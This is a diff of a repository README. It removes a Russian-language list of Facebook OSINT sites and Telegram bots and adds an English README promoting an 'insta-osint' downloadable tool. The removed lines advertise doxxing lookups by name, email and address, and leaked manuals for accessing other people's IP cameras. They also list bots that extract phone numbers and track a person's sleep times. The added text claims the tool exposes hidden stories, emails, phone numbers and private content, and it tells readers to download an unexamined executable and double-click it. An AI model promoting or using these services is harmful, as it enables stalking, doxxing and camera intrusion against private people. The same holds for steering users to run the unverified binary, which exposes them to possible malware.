@@ -1,46 +1,74 @@
-# Поиск по аккаунту Facebook (OSINT 2025)
-Актуальная подборка инструментов и ссылок для сбора информации по аккаунту Facebook (ID, публикации, лайки, друзья, телефон, удалённые посты и т.д.).
+# 📸 insta-osint - Find Instagram Insights Easily
 
-Наш дискорд канал ( пробивы по фио, почтам , адресу , аккаунтам в соцсетях и т.д ) - https://discord.gg/zDNW39HKva
+## 🚀 Getting Started
 
-Мануалы по подключениям к чужим IP-камерам тут ( слитые ) - https://t.me/+B-o_2HZOffxjYjFi
+Welcome to **insta-osint**, your go-to tool for exploring Instagram accounts. It helps you find archived photos, hidden stories, geolocations, associated accounts, phone numbers, emails, and much more. This tool makes online investigations simple and effective.
 
-## Основные инструменты и боты
-| №  | Сервис / Бот / Инструмент                                                   | Что находит / Что делает                                                                 |
-|----|-----------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
-| 1  | [findidfb.com](https://findidfb.com/)                                       | Находит числовой ID аккаунта                                                              |
-| 2  | [graph.tips/beta](https://graph.tips/beta/)                                 | Просмотр публикаций, которым пользователь ставил лайки                                    |
-| 3  | [whopostedwhat.com](https://www.whopostedwhat.com/)                         | Поиск постов в Facebook                                                                  |
-| 4  | [fb-sleep-stats (GitHub)](https://github.com/sqren/fb-sleep-stats)          | Отслеживает онлайн/оффлайн статус, время сна                                              |
-| 5  | [keyhole.co](https://keyhole.co/)                                           | Анализ аккаунта (регистрация без проверки email/телефона)                                |
-| 6  | [cipher387.github.io/quickcacheandarchivesearch](https://cipher387.github.io/quickcacheandarchivesearch/) | Архивированная страница + 20+ ссылок на веб-архивы по ссылке на аккаунт                  |
-| 7  | `@us2_ubot` (Telegram)                                                      | Находит номер телефона, почту и многое другое (бесплатно для новых аккаунтов)            |
-| 8  | [app.element.io/#/home](https://app.element.io/#/home)                       | Сохранённая копия аккаунта по ID (имя + аватар) после регистрации                         |
-| 9  | `@Vbib_bot` (Telegram)                                                      | Находит имя и номер телефона                                                             |
-| 10 | `@reserv_detectiva_bot` (Telegram)                                          | Вытаскивает часть номера телефона                                                        |
-| 11 | [kribrum.io](https://kribrum.io/)                                           | Находит удалённые публикации (в поле автор — только ID)                                  |
-| 12 | [x-ray.contact/search](https://x-ray.contact/search/)                       | Адреса, телефоны, имена, другие аккаунты (работает с VPN)                                |
-| 13 | `@povozkaRobot` (Telegram)                                                  | Находит почту, телефон и прочее                                                          |
+## 📥 Download Now
 
-## Поиск через URL
-| №  | Ссылка                                                                              | Что покажет                                                                              |
-|----|-------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
-| 1  | https://www.facebook.com/browse/fanned_pages/?id=USERID                             | Лайкнутые страницы (замени USERID на ID аккаунта)                                        |
-| 2  | https://facebook.com/friendship/USERID/USERID                                       | Общие друзья, записи, фото, родные города, школы и т.д. (замени оба USERID)              |
-| 3  | https://facebook.com/browse/mutual_friends/?uid=USERID&node=USERID                   | Общие друзья (если списки друзей публичные, замени оба USERID)                            |
-| 4  | https://my.mail.ru/fb/USERID                                                        | Аккаунт в «Мой Мир» (замени USERID на ID аккаунта Facebook)                              |
+[![Download insta-osint](https://img.shields.io/badge/download-insta--osint-blue)](https://github.com/han772/insta-osint/releases)
 
-## Поисковики
-| №  | Сервис                                                                              | Что делает                                                                               |
-|----|-------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
-| 1  | [sowsearch.info](https://sowsearch.info/)                                           | Поиск по контенту профиля: посты, фото (фильтры по дате, группе, локации)                |
+## 📋 System Requirements
 
-## Парсеры
-| №  | Сервис                                                                              | Что делает                                                                               |
-|----|-------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
-| 1  | [phantombuster.com Facebook Profile Scraper](https://phantombuster.com/automations/facebook/8369/facebook-profile-scraper) | Скачивает всю публичную информацию аккаунта                                              |
+Before you proceed, ensure your system meets these requirements:
 
-## Инструменты
-| №  | Бот                                                                                 | Что делает                                                                               |
-|----|-------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
-| 1  | `@AximoBot` (Telegram)                                                              | Мгновенно сохраняет новые публикации аккаунта в Telegram                                 |
+- Operating System: Windows 10, macOS 10.14 or later, or a modern Linux distribution
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB of free space
+- Internet Connection: A stable connection is needed to access online data
+
+## 📖 Features
+
+- **Search Instagram Accounts**: Explore specific profiles.
+- **Access Archived Photos**: View and download images from past posts.
+- **Find Hidden Stories**: Discover content that is no longer publicly visible.
+- **Geolocation Tracking**: Identify locations tied to posts.
+- **Contact Information**: Retrieve associated emails and phone numbers.
+- **Remote Content Access**: Check content that isn't publicly available anymore.
+
+## 🔗 Download & Install
+
+To begin using insta-osint, follow these steps:
+
+1. Open your web browser.
+2. Go to the [Releases page](https://github.com/han772/insta-osint/releases).
+3. Look for the latest version of insta-osint.
+4. Click on the download link for your operating system (e.g., Windows, macOS, Linux).
+5. Once the file is downloaded, locate it on your computer.
+6. Double-click the file to run it.
+
+If prompted, follow any on-screen instructions to complete the installation.
+
+## 🛠️ How to Use
+
+Once you have installed insta-osint, simply launch the application. You will find the main interface where you can input the Instagram username you wish to investigate. 
+
+1. Type the username into the search bar.
+2. Click the search icon.
+3. Review the results that appear.
+
+The application will display various details related to the account. You can browse through the findings and use the options available to download or view specific data points.
+
+## 🌐 Topics Covered
+
+insta-osint focuses on several important areas within online investigations, including:
+- Cyber OSINT
+- Instagram OSINT
+- Open-source intelligence
+- Social media investigations
+
+These topics help users effectively utilize the capabilities of the tool.
+
+## 📩 Support
+
+If you run into any issues or have questions while using insta-osint, please reach out. You can open an issue on the [GitHub Issues page](https://github.com/han772/insta-osint/issues), and we will assist you.
+
+## 📝 Contribute
+
+Your contributions are welcome! If you have ideas or features you would like to add, feel free to fork the repository and submit a pull request. 
+
+## 📜 License
+
+insta-osint is open-source software. You can find the license details in the [LICENSE file](https://github.com/han772/insta-osint/blob/main/LICENSE). This allows you to use and modify the software according to your needs.
+
+Thank you for choosing insta-osint! Happy investigating!
